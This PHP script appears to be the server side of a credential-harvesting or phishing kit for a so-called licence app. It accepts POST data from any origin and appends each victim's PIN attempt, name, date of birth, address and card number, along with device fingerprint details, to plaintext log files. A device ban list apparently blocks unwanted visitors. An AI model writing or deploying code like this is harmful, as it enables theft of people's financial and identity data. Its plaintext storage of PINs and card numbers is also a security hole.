<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");

$data = json_decode(file_get_contents('php://input'), true) ?? [];

// === EARLY BAN CHECK USING DEVICE ID ===
$bannedFile = '/var/www/licence/banned_devices.txt';
$deviceId = $data['deviceId'] ?? 'unknown';

if (file_exists($bannedFile)) {
    $banned = file($bannedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($deviceId, $banned)) {
        http_response_code(403);
        echo "Access Denied - You have been banned.";
        exit;
    }
}

// === Normal logging continues if not banned ===
$timestamp = date('Y-m-d H:i:s');
$ip = $data['ip'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';

$event   = $data['event'] ?? 'unknown';
$success = $data['success'] ?? false;
$pin     = $data['pin_attempt'] ?? '—';
$name    = $data['name'] ?? '—';
$dob     = $data['dob'] ?? '—';
$address = $data['address'] ?? '—';
$card    = $data['card'] ?? '—';
$screen  = $data['screen'] ?? '—';
$tz      = $data['timezone'] ?? '—';
$lang    = $data['language'] ?? '—';
$plat    = $data['platform'] ?? '—';

$historyLine = sprintf("%s | IP: %s | DeviceID: %s | Event: %s | Success: %s | PIN: %s | Name: %s | DOB: %s | Address: %s | Card: %s | Screen: %s | Timezone: %s | Language: %s | Platform: %s\n",
    $timestamp, $ip, $deviceId, $event, $success ? 'YES' : 'NO', $pin, $name, $dob, $address, $card, $screen, $tz, $lang, $plat);

file_put_contents('/var/log/licence-app/access.log', $historyLine, FILE_APPEND | LOCK_EX);

$statusFile = '/var/log/licence-app/latest.log';
$stateFile  = '/var/log/licence-app/latest_state.json';
$state = file_exists($stateFile) ? json_decode(file_get_contents($stateFile), true) : [];

$state[$deviceId] = [
    'timestamp' => $timestamp,
    'event'     => $event,
    'success'   => $success ? 'YES' : 'NO',
    'pin'       => $pin,
    'name'      => $name,
    'dob'       => $dob,
    'address'   => $address,
    'card'      => $card,
    'screen'    => $screen,
    'timezone'  => $tz,
    'language'  => $lang,
    'platform'  => $plat
];

$lines = [];
foreach ($state as $key => $info) {
    $lines[] = sprintf("%s | IP: %s | DeviceID: %s | Event: %s | Success: %s | PIN: %s | Name: %s | DOB: %s | Address: %s | Card: %s | Screen: %s | Timezone: %s | Language: %s | Platform: %s",
        $info['timestamp'], $ip, $key, $info['event'], $info['success'], $info['pin'],
        $info['name'], $info['dob'], $info['address'], $info['card'],
        $info['screen'], $info['timezone'], $info['language'], $info['platform']);
}

file_put_contents($statusFile, implode("\n", $lines) . "\n");
file_put_contents($stateFile, json_encode($state));

http_response_code(200);
?>
